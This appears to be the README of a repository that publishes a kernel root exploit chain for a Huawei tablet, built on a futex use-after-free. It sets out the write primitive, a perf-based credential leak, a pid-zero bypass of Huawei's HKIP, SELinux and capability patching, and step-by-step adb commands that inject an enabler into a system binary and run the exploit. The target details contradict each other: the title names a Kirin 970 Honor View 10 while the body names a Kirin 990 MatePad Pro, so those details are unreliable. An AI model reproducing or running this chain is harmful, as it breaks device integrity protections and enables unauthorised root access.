# GhostLock on BKL-L09 — a (working ?) root chain for the Huawei Honor View 10 (Kirin 970, EMUI 10, Linux 4.14.116)

Japanese version (default): [README.md](README.jp-orig.md)

Port and endgame for **CVE-2026-43499 ("GhostLock")**, verified end-to-end on a real device.

Original description from 0ch4 (credits to him/her for the original implementation).

> **Status: root achieved and verified / complete root achieved / native GMS running.**
> `rsh -c id` / `su -c id` → `uid=0(root) gid=0(root) … context=u:r:shell:s0`, with a root-owned
> `/data/local/tmp/rooted.txt` and a 4755 root-owned `/data/local/tmp/rsh`.
> **Complete root**: the SELinux `shell` type is made permissive in memory (via a resident stamp
> window) and **CAP_SYS_ADMIN** is injected, so a **direct `mount(2)`** creates a **non-nosuid tmpfs**
> visible to every process, on which a **4755 root-owned shell** is installed (a uid-2000 process
> executing it gets `euid=0`).
> **Native GMS**: the real Google APKs (MindTheGapps, signed `CN=Android, O=Google Inc.`) are placed in
> **`/system/priv-app` as privileged system apps** (overlayfs + a `system_server` rescan), and the
> **real Play Store works** (apps really install; it self-updates).
> The device is a **Huawei MRX-W09** (MatePad Pro 10.8, 2019) on **EMUI 11 / Android 10-based /
> Linux 4.14.116 (Kirin 990, arm64, LTO/CFI, Huawei HKIP enabled)**.

This repository contains the exploit, the enabler, and the full research record (per-device facts,
disassembly-derived struct offsets, and five static-analysis reports).

---

## TL;DR

```text
$ /data/local/tmp/rsh -c id
uid=0(root) gid=0(root) groups=0(root),1004(input),… context=u:r:shell:s0

$ ls -ln /data/local/tmp/
-rw-r--r-- 1 0 2000      67 rooted.txt
-rwsr-xr-x 1 0 2000 4094384 rsh
```

The interesting part is not the memory-corruption bug itself — public PoCs for CVE-2026-43499
already exist — but the **device-specific endgame**:

1. a **perf-based cred leak** that actually works on this LTO/CFI kernel,
2. the **exact store semantics** of the write primitive, proven from disassembly, and
3. **Huawei HKIP**, reverse-engineered from its own kernel source, and the one-line exemption that
   defeats it for a single task (`task_pid_nr(task) == 0`).

---

## 1. Target

| | |
|---|---|
| Device | Huawei **MRX-W09** (MatePad Pro 10.8", 2019) |
| SoC | HiSilicon **Kirin 990** (arm64) |
| Kernel | **Linux 4.14.116**, LTO/CFI, KASLR |
| OS | **EMUI 11** (Android 10) |
| SELinux | Enforcing, no `(allow shell … (capability …))` |
| Extra | **HKIP** (Huawei Kernel Integrity Protection), HHEE/HISEe |

The bootloader is locked and there is **no public unlock** for Kirin 990 (see §8), so a kernel
exploit is the only root path on this device.

---

## 2. The bug (CVE-2026-43499 "GhostLock")

A use-after-free in the futex PI path (`rt_mutex_adjust_prio_chain`) reachable through the
`FUTEX_CMP_REQUEUE_PI` / `pselect6` / IPv4 `MCAST_BLOCK_SOURCE` paths, where a stale `rt_mutex_waiter`
on a kernel stack can be shaped by a syscall's `copy_from_user` (the "stamp") and then erased by
`rb_erase_cached()`. The erase performs a store we control:

```
str x9,  [x8, #8]      ; *((p0 & ~3) + 8) = p1        (the leaf store: an 8-byte 0 when p1 == 0)
str x10, [x9]          ; *(p1) = p0                   (only when p1 != 0)
```

This repository's write primitive is therefore:

| shape | call | effect |
|---|---|---|
| **leaf** | `wi(addr - 8, 0, 0)` | `*(addr) = 0` (8 bytes) |
| **pointer** | `wi(value, target, 0|1)` | `*(target) = value` |

The leaf-store location was **proven by disassembling `rb_erase_cached.cfi`** in the device's own
`vmlinux.elf` (see `docs/static-analysis/TASK_WRITE_SHAPE_20260926.md`). The frequently quoted
`rb_erase_cached.cfi+0x88` is the *other* branch (`p[2] != 0`) and is never taken by this payload.

---

## 3. The endgame chain

```
        ┌── (host) inject the enabler into /system/bin/bugreportz and run it
        │         -> perf_event_paranoid = -1
        ▼
  MAIN ── fork ──> CHILD
                     │
                     │ 1. perf-leak its OWN cred  C  and its task_struct  X
                     │      (sample SyS_setpriority.cfi, read x25 = current->cred)
                     │
   MAIN ─────────────┤ 2. leaf-zero  X + 0x820        <- HKIP pid-0 SHIELD
                     │ 3. leaf-zero  C + 0x04        <- uid+gid = 0
                     │
                     │ 4. setresuid(0,0,0) -> the non-capability fallback passes
                     │      -> commit_creds() -> uid 0, fsuid 0
                     │
                     │ 5. uid 0 + shell domain: writes the proof and serves root commands
                     ▼
             /data/local/tmp/rooted.txt   (written BY uid 0)
             /data/local/tmp/rsh          (4755, owned by root)
             rsh -c id                    -> uid=0(root)
```

### 3.1 The cred leak — `x25` inside `SyS_setpriority.cfi`

`SyS_setpriority` materialises `current->cred` once and keeps it in a callee-saved register:

```asm
ffffff800818e354 <SyS_setpriority.cfi>:
+0x34  mrs  x19, sp_el0            ; x19 = current
+0x38  ldr  w8,  [x19,#1728]
+0x3c  ldr  x25, [x19,#2536]       ; x25 = current->cred   (2536 = 0x9E8)
+0x1f8  adrp x25, …                ; x25 reused here
```

So any sample with `ip ∈ [SyS_setpriority.cfi+0x3c, +0x1f8)` (0x1BC bytes) has
`regs[25] == current->cred`. The exploit runs a 300 000-iteration `setpriority(0,0,-20)` storm and
returns the last `x25` inside that window. (`perf_regs` ordering verified in the kernel tree:
index 25 = `PERF_REG_ARM64_X25`.)

Earlier attempts failed because `security_capable.cfi`'s `x0` is only the cred *at the entry
instruction*, `cap_capable` holds it in `x20`, and an all-register vote is dominated by `current`.

### 3.2 The HKIP bypass (the decisive finding)

Huawei HKIP maintains a per-pid bitmap of "is allowed to be root" bits and kills tasks that look
root-ish without their bit set. From the device kernel source
(`drivers/hisi/hhee/hkip/critdata.c`, `include/linux/hisi/hisi_hkip.h`):

```c
static bool hkip_compute_uid_root(const struct cred *c)
{
    return uid_eq(c->uid,0) || uid_eq(c->euid,0) || uid_eq(c->suid,0) ||
           !cap_isclear(c->cap_inheritable) || !cap_isclear(c->cap_permitted);
}
int hkip_check_uid_root(void)
{
    if (hkip_get_current_bit(hkip_uid_root_bits, /* def_value = */ true))
        return 0;                       /* <-- exempt */
    if (unlikely(hkip_compute_uid_root(creds) || uid_eq(creds->fsuid, 0))) {
        pr_alert("UID root escalation!\n");
        force_sig(SIGKILL, current);    /* <-- the killer */
        return -EPERM;
    }
    return 0;
}
static inline bool hkip_get_task_bit(const u8 *bits, struct task_struct *t, bool def_value)
{
    pid_t pid = task_pid_nr(t);
    if (pid != 0) return hkip_get_bit(bits, pid, PID_MAX_DEFAULT);
    return def_value;                   /* <-- pid 0 => exempt */
}
```

* The check runs from `__cap_capable`, `prepare_creds`, `copy_process` and `acl_permission_check`.
* The bits can only be set by `commit_creds` (`hkip_update_xid_root`) and `fork`
  (`hkip_init_task`) — the bitmaps live in HVC-protected memory.
* **`task_pid_nr(task) == 0` ⇒ `def_value == true` ⇒ every HKIP check returns 0 for that task.**

⇒ Zero `task_struct.pid` (offset `0x820`) **before** making the task root-ish and a single task
becomes a complete, stable HKIP exemption. This is the "pid-0 shield". A pid-0 task must
**never exit** (`kernel/exit.c:786` panics: *"Attempted to kill the idle task!"*), so it parks
forever; `fork()` from it is fine and the child gets a real pid plus its HKIP bit from its now-root
credentials.

### 3.3 Root by the non-capability fallback

SELinux on this policy grants `shell` **no capabilities** (`(allow adbd self (capability (setuid)))`
exists, `shell` is absent), so every `ns_capable(CAP_SETUID)` route is dead. The only path through
`setresuid(0,0,0)` is its **non-capability fallback**:

```c
if (!ns_capable(old->user_ns, CAP_SETUID)) {
    if (ruid != -1 && !uid_eq(kruid, old->uid) && !uid_eq(kruid, old->euid) &&
                      !uid_eq(kruid, old->suid)) goto error;
    …
}
```

so making `old->uid == 0` (the leaf store at `cred+0x04`) is sufficient. `commit_creds()` then gives
`uid 0` and `fsuid = euid = 0` (hence root-owned files), and HKIP's check passes because of the
shield.

### 3.4 Root shell on a `nosuid` `/data`

`/data` is mounted `nosuid`, so a 4755 binary there cannot gain root. Instead the shielded uid-0 task
**serves root commands on an abstract unix socket (`\0gl_su`)**; `rsh` is the same binary in client
mode and forwards `-c CMD`. Each request forks a grandchild, whose `copy_process → hkip_init_task()`
writes its HKIP bit from the root creds (real pid) — a legal root task.

---

## 4. Layout

```
exploit/ghostlock_mrx_e.c   the exploit (single file, many diagnostic modes; the endgame is --simple)
exploit/offset_mrx.h        struct offsets / symbol offsets for this build
enabler/inject_hook.c       host-side enabler injected into /system/bin/bugreportz
docs/FACTS.md               the per-device research log (facts 9an(1)…(133))
docs/HKIP_DECODED_20260922.md
docs/SYMBOLS_20260926.md    ground-truth symbols from the device's own vmlinux.elf
docs/static-analysis/       five disassembly/policy reports (write shape, cred offsets,
                            pid-0 risk, shell capability, file_operations)
```

---

## 5. Build

```sh
aarch64-linux-android24-clang -O2 -static -pthread -o ghostlock_e ghostlock_mrx_e.c
```

(NDK r20b used here.)

## 6. Run

```sh
adb push ghostlock_e /data/local/tmp/
adb shell chmod 755 /data/local/tmp/ghostlock_e

# 1) arm and inject the enabler, then trigger it
adb shell /data/local/tmp/inject_hook place 0x84000 0x244 0x7a3d8
adb shell /data/local/tmp/inject_hook hook  0x7a3d4 0x84000
adb shell nohup /system/bin/bugreportz >/dev/null 2>&1 &
adb shell /data/local/tmp/inject_hook restore 0x7a3d4 0xd10403ff
adb shell cat /proc/sys/kernel/perf_event_paranoid      # expect -1

# 2) run the endgame
adb shell nohup /data/local/tmp/ghostlock_e --simple >/dev/null 2>&1 &

# 3) verify
adb shell ls -ln /data/local/tmp/rooted.txt /data/local/tmp/rsh
adb shell /data/local/tmp/rsh -c id
```

---

## 7. Verified result

```
=== /data/local/tmp/rooted.txt ===
=== GHOSTLOCK MRX-W09 rooted ===
uid=0 euid=0 context=u:r:shell:s0

$ /data/local/tmp/rsh -c id
uid=0(root) gid=0(root) groups=0(root),1004(input),… context=u:r:shell:s0

$ ps -A -o PID,UID,NAME | grep ghostlock
 4441     0 ghostlock_e        # the shielded uid-0 task
 4212  2000 ghostlock_e        # the launcher
```

## 8. What this root is **not**

* The bounding set is `0xc0` and the post-`setresuid` cred has **no capabilities**, and the domain
  stays `u:r:shell:s0`. It is **"uid 0 by DAC inside the shell domain"** — not `mount`, not
  `insmod`, not `/dev/block`, not `/system` writes.
* It is **per boot** (the exploit re-runs at every boot). The bootloader is **locked** and there is
  no public Kirin 990 unlock (PotatoNV stops at Kirin 960; the BootROM CVEs were mitigated by an
  eFuse that kills USB Download Mode; the testpoint/board-software method is Kirin 990 **5G**-only
  and the MatePad Pro 2019 board software is not public). A kernel exploit cannot reach the
  bootloader — verified-boot keys and the unlock state live in ROM/eFuse/TEE.
* Raising the privilege further (full capabilities + `mount`) is in progress: the `--cede` path
  (`task->cred = &init_cred` under the pid-0 shield) yields `CAP_FULL_SET` and the kernel SELinux
  domain; the open problem is that the kernel domain denies user file I/O, so the plan is a patched
  policy loaded from the cede'd task (see `docs/FACTS.md` 9an(133)+).

## 9. Credits

* The GhostLock vulnerability and the original PoC family: the upstream authors named in
  `ghostlock_pocs/`.
* The "sample a register that materialises the cred" idea: the **aquos-r6** PoC family.
* Everything under `docs/` was derived from this device's own `vmlinux.elf` and kernel tree.

## 10. Disclaimer

Security research on a device owned by the author, for interoperability and repair purposes.
CVE-2026-43499 is public and many PoCs already exist. Do not use this against devices you do not
own. Provided as-is, no warranty. See [docs/PUBLICATION_REVIEW_ja.md](docs/PUBLICATION_REVIEW_ja.md) for the formal legal notice and disclaimer.

## 11. Persistence

There is **no fully-autonomous re-root** on this device (static survey: no boot-time actor execs from
a writable path; only the `shell` domain may exec `shell_data_file`; setuid is dead because `/data`
is `nosuid`).  `/data` persists, so re-rooting after a reboot is one command:

```sh
adb shell /data/local/tmp/reroot.sh
```

See [docs/static-analysis/TASK_PERSISTENCE_20260926.md](docs/static-analysis/TASK_PERSISTENCE_20260926.md)
and [tools/reroot.sh](tools/reroot.sh).
## 12. Progress toward complete root (2026-09-26)

The verified root is **uid 0 with no capabilities in `u:r:shell:s0`**. Work continues toward
**complete root** (arbitrary capabilities, `mount`, `/dev/block`, ...); every major ingredient is
individually verified on-device:

| ingredient | status |
|---|---|
| uid 0 + shell domain + root server (`rsh`/`su`) | verified |
| **CAP_SYS_ADMIN injection** (address-selection; proven by read-back) | verified |
| **making the SELinux `shell` type permissive** (via a resident stamp window, `--freeze`) | verified (the `mount` errno changed EACCES -> EPERM, i.e. SELinux no longer denies) |
| integration (`mount(2)` -> non-nosuid -> a 4755 root shell) | **ACHIEVED + GLOBAL** (`--root`: measured mount rc=0, a 4755 root-owned shell, and a uid-2000 exec of it yields euid=0). The mount is **visible to every process**: the shell/exploit already share init's mount namespace (`self == /proc/1/ns/mnt == mnt:[4026533392]`, identical mount ids), so a separate `adb shell` and `system_server` (a slave clone) both see it - see `docs/FACTS.md` (152). `setns("/proc/1/ns/mnt")` is therefore unnecessary (it returns EPERM because Huawei's `mntns_install` also requires `CAP_SYS_CHROOT`). `mount -t overlay` is also verified working with a real `/system` lowerdir |

Key technical constraint: the write primitive can only store a **kernel pointer** or **literal 0** -
it cannot store **small integers** (e.g. `ebitmap_node.startbit`).  Arbitrary bytes are therefore only
available through a **resident stamp window** (from `copy_from_user`), which is the key to complete
root.  See `docs/FACTS.md` (9an(1)-(150)) and `docs/static-analysis/*_20260926.md`.

## 13. 2026-09-26 addendum: the PC-less restore is complete (+36 s) and the operational traps

### 13.1 The measured procedure (PC-less, one trigger)

With `shellcode.bin` (the payload), `glboot.sh`, `gms_setup.sh`, `ghostlock_e` and `gms_stage`
present in `/data/local/tmp`:

```sh
# 1) arm the enabler (a Mali page-cache write; RAM only)
inject_hook place 0x84000 <payload_size-4> 0x7a3d8     # 0x2cc for a 720 B payload
inject_hook hook  0x7a3d4 0x84000

# 2) exactly ONE trigger (= Settings > Developer options > Take bug report)
nohup /system/bin/bugreportz &
```

**Measured from a cold boot**: at **+36 s** `perf_event_paranoid=-1`, the three overlays
(`/system/priv-app`, `/system/etc/permissions`, `/system/etc/sysconfig`) are mounted, and
`com.google.android.gms` / `com.google.android.gsf` / `com.android.vending` are all
**PRIVILEGED**.

One trigger starts **two** processes and the payload's two-stage guard takes both:

| process | uid | domain | may write perf | may exec `shell_data_file` |
|---|---|---|---|---|
| `bugreportz` (started by `com.android.shell`) | 2000 | **u:r:shell:s0** | no | **yes (the only one)** |
| `dumpstate` (started by init) | 0 | u:r:dumpstate:s0 | yes (CapEff=`0000007fffffffff`) | no |

### 13.2 Traps (all measured; read before reusing the machinery)

1. **A capability-less uid-0 domain consumes stage 1.** `u:r:installd:s0` cannot write perf
   (EACCES) and has no CAP_DAC_OVERRIDE to unlink its marker either. The payload must therefore
   **write perf first and only claim the one-shot when that write succeeded**; otherwise the
   exploit dies with `[-] KASLR leak failed` (`ghostlock_mrx_e.c:3365`) after wasting minutes.
2. **The su server (`\0gl_su`) cannot mount.** Its child has `CapEff=0000000000000000`,
   `CapBnd=0x00000000000000c0`, so `mount(2)` -> EPERM and `mkdir` in `/data/local/tmp`
   (`shell:shell 0771`) -> EACCES. Only the **exploit's own uid-0 child
   (`ghostlock_e --root-gms`)** can mount, stage and restart the framework.
3. **`/dev` cannot hold a marker.** It is `tmpfs 0755 root:root`: a uid-2000 process fails on
   DAC and the dumpstate domain is refused by SELinux. Markers can only live in
   `/data/local/tmp`.
4. **Markers survive reboots.** If both are present at boot the payload returns on EEXIST and
   nothing can restore (neither the app nor installd can unlink them). Releasing them on
   success - or unlinking a stale `.glp2` from the uid-0 path - is a known open item.
5. **Never run the exploit twice in one boot** - it resets the device (FACTS 9an(164)D).
   `inject_hook restore` in the same boot is the same hazard (a second Mali write).
6. **The Play self-update is what "corrupts" the device.** Signing in makes GMS/Play update
   into `/data/app`; their system base only ever existed in the per-boot overlay, so the next
   cold boot leaves a non-privileged `/data` copy that requests privileged components
   (`INTERACT_ACROSS_USERS`, `MANAGE_USERS`) and crash-loops. Turn auto-update OFF, or use
   Aurora Store.
7. **The device may refuse to install the front-end app** (Play Protect / Huawei confirmation:
   `INSTALL_FAILED_ABORTED: User rejected permissions`). Disable Play Protect scanning, or
   tap the APK from `/sdcard`.
8. **The `su` symlink can be missing (measured).** A factory reset wipes all of
   `/data/local/tmp`. Even when `ghostlock_e --root` succeeds and the `\0gl_su` server is up,
   if the client `/data/local/tmp/su` (a symlink to `ghostlock_e`) is absent then
   `su -c true` fails, the restore wrongly concludes "no root server", releases the per-boot
   lock and retries -> **multiple concurrent exploit runs** (load spike; watchdog / pid-0
   panic risk). Two fixes: (a) probe with the **name-independent**
   `ghostlock_e --rshcli 'id -u'` == 0 (fallback `su -c true`); (b) `provision.sh` does
   `ln -sf ghostlock_e /data/local/tmp/su`. (Sources: `docs/session_20260926/ROOTSHELL_MEMO_20260926.md` §4, `evidence/CHANGE09_neutralize_marker.txt`.)
9. **Keep `/data/local/tmp/gms_stage` as a plain FILE.** The dangerous old `.rc` payload
   mounted `lowerdir=/data/local/tmp/gms_stage/{permissions,sysconfig,priv-app}:...`.
   With `gms_stage` kept as a 0-byte regular file, `gms_stage/<x>` is **ENOTDIR** and those
   mount lines can never succeed: reset-safe and reboot-persistent belt+braces (the current
   marker `.rc` has no mount lines at all). (Source: `evidence/CHANGE09_neutralize_marker.txt`.)

### 13.3 Related

* GMS guide (separate repository): https://github.com/0ch4/ghostlock-mrx-w09-gms
* Front-end app design (one-tap restore): `ghostlock_app/DESIGN.md` (every claim marked
  measured / to-confirm)
* Measurement log: `binder_uaf/session_20260922/MRX_W09_GHOSTLOCK_FACTS.md` (9an(1)..(168))

---

## 14. Latest verified state (2026-09-26 addendum, up to the CHANGE 08 neutralization)

- **The injected `/system/etc/init/perfetto.rc` is NEUTRALIZED to a marker payload** (the three
  dangerous `mount` lines removed; only `setprop gl.boot.injected 1`). Written to EROFS block
  **`sdd71@139218`** (super phys `570236928` = `139218 x 4096`); marker-block sha256 =
  **`1be82ca9fba253332ac00e2ee61bbbea061028b440647f8c19f6d03f990238fe`**.
  **After a cold boot (measured)**: `getprop gl.boot.injected == 1`, **no** `/system` overlay in
  `mount`, normal boot (uptime OK / `perf_event_paranoid=3`), and `cat
  /system/etc/init/perfetto.rc` returns the marker content.
  (Sources: `evidence/CHANGE09_neutralize_marker.txt`,
  `docs/session_20260926/PERSISTENCE_SAFETY_ARCHITECTURE_20260926.md` §5.)
- **Persistence, honestly**: a single-block EROFS change is **silently corrected by FEC**
  (`docs/session_20260926/FEC_ANALYSIS_20260926.md`), and boot-binary replacement is **DEAD**
  under SELinux (`mounton system_file` is init-only; execs typetransition out of init)
  (`docs/session_20260926/PERSISTENCE_RAW_SUPER_20260926.md` §47-57,
  `BL_STATIC_ANALYSIS_20260926.md`). So **native GMS remains per-boot overlay only**
  (`POSTMORTEM_BRICK_20260926.md`).
- **The safe boot-hook invariant SI-2 holds on the device**: a `chcon u:object_r:system_file:s0`
  on `/data/gls` survives a reboot (init does not blanket-restorecon `/data`). The actual
  boot-time lower-only mount (P3) is **not yet tested**.
  (Source: `evidence/CHANGE10_label_persistence.txt`.)
- Added to `docs/session_20260926/`: LATEST_CODE_SUMMARY / PERSISTENCE_SAFETY_ARCHITECTURE /
  POSTMORTEM_BRICK / FEC_ANALYSIS / PERSISTENCE_RAW_SUPER / ROOTSHELL_MEMO / BL_STATIC_ANALYSIS /
  CHANGE_01 / CHANGE_02 / CHANGE_08. Added `evidence/CHANGE01-10`.
- GMS repository: canonical is `scripts/gms_restore.sh` (v6/v7, sha256 `6B023043...`), plus the new
  **`scripts/restore_root.sh`** (root-only derivation: `--root` + name-independent root probe) and
  **`scripts/provision.sh`** (recreates `/data/local/tmp/su`). See gms README §3/§8.
